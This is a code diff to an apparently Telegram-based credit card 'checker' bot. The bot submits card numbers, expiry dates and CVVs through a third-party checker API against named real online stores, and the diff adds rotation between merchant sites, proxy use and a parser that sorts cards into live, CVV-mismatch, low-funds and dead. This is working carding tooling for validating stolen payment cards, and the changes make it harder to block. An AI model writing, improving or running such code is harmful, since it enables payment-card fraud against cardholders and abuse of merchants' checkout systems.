@@ -155,7 +155,21 @@ def get_proxies():
     with PROXY_LOCK:
         return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None
 
-DEFAULT_BRAINTREE_SITE = "https://store.segway.com,https://www.asedeals.com,https://www.broderbund.com"
+DEFAULT_BRAINTREE_SITES = [
+    "https://store.segway.com",
+    "https://www.asedeals.com",
+    "https://www.broderbund.com",
+]
+DEFAULT_BRAINTREE_SITE = DEFAULT_BRAINTREE_SITES[0]
+_site_index = 0
+_site_lock = threading.Lock()
+
+def get_next_site():
+    global _site_index
+    with _site_lock:
+        site = DEFAULT_BRAINTREE_SITES[_site_index % len(DEFAULT_BRAINTREE_SITES)]
+        _site_index += 1
+        return site
 JOSS_API = "https://b3.mr-checker.net/api/wpg.php"
 
 user_sessions = {}
@@ -310,7 +324,7 @@ def require_approval(func):
 def get_braintree_site(chat_id):
     if chat_id in user_custom_sites and user_custom_sites[chat_id]:
         return user_custom_sites[chat_id]
-    return DEFAULT_BRAINTREE_SITE
+    return get_next_site()
 
 class BraintreeChecker:
     def __init__(self, chat_id):
@@ -345,26 +359,43 @@ class BraintreeChecker:
 
         site_url = get_braintree_site(self.chat_id)
 
-        dead_keywords = [
-            'declined','do not honor','lost card','stolen card','pickup card','restricted card',
-            'call issuer','expired card','invalid number','invalid card','incorrect number',
-            'no such issuer','transaction not allowed','payment not allowed','processing error',
-            'rejected','fraud','risk','security violation','authentication failed','card blocked',
-            'blocked','blacklist','not permitted','invalid cvc','invalid expiry','invalid exp',
-            'zip code mismatch','avs failed','avs mismatch','processor declined'
-        ]
-        ccn_keywords = ['cvv','cvc','security code','incorrect cvc','cvv mismatch']
-        funds_keywords = ['insufficient','not enough funds','balance low']
-        live_keywords = ['approved','success','authorized','payment successful','thank you']
+        def parse_wpg_response(raw, elapsed_time):
+            # Format: "#DEAD\n    <br>Reason.\n    <br>BIN info"
+            parts = re.split(r'<br\s*/?>', raw, flags=re.IGNORECASE)
+            parts = [re.sub(r'<[^>]+>', '', p).strip() for p in parts]
+            parts = [p for p in parts if p and not p.startswith('#')]
+            reason = parts[0] if parts else 'Unknown'
 
-        # Retry logic for API calls
-        max_retries = 5
-        for attempt in range(max_retries):
+            rt = raw.upper().strip()
+            if rt.startswith('#LIVE'):
+                return {'status': 'live', 'message': reason[:80], 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
+            elif rt.startswith('#CCN'):
+                return {'status': 'live_cvv', 'message': reason[:80], 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
+            elif rt.startswith('#FUNDS') or rt.startswith('#INSUF'):
+                return {'status': 'insufficient', 'message': reason[:80], 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
+            elif rt.startswith('#DEAD') or rt.startswith('#ERROR'):
+                return {'status': 'dead', 'message': reason[:80], 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
+            rl = raw.lower()
+            if any(k in rl for k in ['approved', 'success', 'authorized']):
+                return {'status': 'live', 'message': reason[:80], 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
+            elif any(k in rl for k in ['cvv', 'cvc', 'security code']):
+                return {'status': 'live_cvv', 'message': reason[:80], 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
+            elif any(k in rl for k in ['insufficient', 'funds']):
+                return {'status': 'insufficient', 'message': reason[:80], 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
+            return {'status': 'dead', 'message': reason[:80] if reason else 'Declined', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
+
+        # Try each site, rotating on failure
+        sites_to_try = (
+            [site_url] if site_url not in DEFAULT_BRAINTREE_SITES
+            else DEFAULT_BRAINTREE_SITES
+        )
+
+        for attempt, current_site in enumerate(sites_to_try):
             try:
                 params = {
                     'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
                     'proxy': '',
-                    'sites': site_url,
+                    'sites': current_site,
                     'xlite': 'undefined'
                 }
 
@@ -379,66 +410,27 @@ class BraintreeChecker:
                 elapsed_time = round(time.time() - start_time, 2)
 
                 if response.status_code != 200:
-                    if attempt < max_retries - 1:
-                        time.sleep(2)
-                        continue
-                    return {
-                        'status': 'error',
-                        'message': f'API Error: {response.status_code}',
-                        'icon': '❌',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
+                    print(f"Site {current_site} returned {response.status_code}, trying next...")
+                    continue
 
-                response_text = response.text.lower()
+                raw = response.text.strip()
 
-                if any(k in response_text for k in live_keywords):
-                    return {'status': 'live', 'message': 'Payment successful', 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
-                elif any(k in response_text for k in funds_keywords):
-                    return {'status': 'insufficient', 'message': 'Insufficient Funds', 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
-                elif any(k in response_text for k in ccn_keywords):
-                    return {'status': 'live_cvv', 'message': 'CVV Mismatch', 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
-                elif any(k in response_text for k in dead_keywords):
-                    return {'status': 'dead', 'message': 'Card Declined', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
+                # If the response is a vague address/AVS error, try next site
+                if 'address error' in raw.lower() and attempt < len(sites_to_try) - 1:
+                    print(f"Site {current_site} gave AVS error, trying next site...")
+                    continue
 
-                return {
-                    'status': 'dead',
-                    'message': 'Card Declined',
-                    'icon': '❌',
-                    'card_info': card_info,
-                    'time': elapsed_time
-                }
+                return parse_wpg_response(raw, elapsed_time)
 
             except requests.exceptions.Timeout:
-                if attempt < max_retries - 1:
-                    print(f"Timeout on attempt {attempt + 1}, retrying...")
-                    time.sleep(2)
-                    continue
-                elapsed_time = round(time.time() - start_time, 2)
-                return {
-                    'status': 'error',
-                    'message': 'Connection timeout',
-                    'icon': '❌',
-                    'card_info': card_info,
-                    'time': elapsed_time
-                }
+                print(f"Timeout on site {current_site}, trying next...")
+                continue
             except Exception as e:
-                if attempt < max_retries - 1:
-                    print(f"Error on attempt {attempt + 1}: {e}, retrying...")
-                    time.sleep(2)
-                    continue
-                elapsed_time = round(time.time() - start_time, 2)
-                print(f"Validation error: {e}")
-                return {
-                    'status': 'error',
-                    'message': f'Error: {str(e)[:30]}',
-                    'icon': '❌',
-                    'card_info': card_info,
-                    'time': elapsed_time
-                }
+                print(f"Error on site {current_site}: {e}, trying next...")
+                continue
 
         elapsed_time = round(time.time() - start_time, 2)
-        return {'status': 'error', 'message': 'Max retries reached', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
+        return {'status': 'error', 'message': 'All sites failed', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
 
 def send_safe(chat_id, text, **kwargs):
     """Safe send message with error handling"""
